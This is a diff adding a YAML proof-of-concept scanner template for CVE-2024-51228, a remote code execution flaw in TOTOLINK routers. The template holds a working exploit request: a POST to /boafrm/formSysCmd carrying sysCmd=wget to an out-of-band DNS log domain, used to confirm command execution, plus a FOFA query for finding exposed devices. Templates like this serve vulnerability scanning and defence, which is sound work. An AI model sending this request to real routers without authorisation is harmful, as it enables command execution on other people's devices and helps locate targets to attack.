@@ -1,0 +1,22 @@
+id: poc-yaml-totop-link-formsyscmd-rce
+info:
+  name: TOTOLINK远程代码执行漏洞(CVE-2024-51228)
+  severity: critical
+  tags:
+  - DNSLOG
+  - rce
+  - CVE-2024-51228
+  finger: totop_link
+  fofa: title="TOTOLINK" || body="<script>function getUserBrowser(){var e=navigator.userAgent"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /boafrm/formSysCmd
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: sysCmd=wget+http://{{.reverseDomain}}
+  expression: "status_code == 302 && \ncontains(body,\"The document has moved\") &&\n\
+    reverse.Verify()\n"
+transport: http
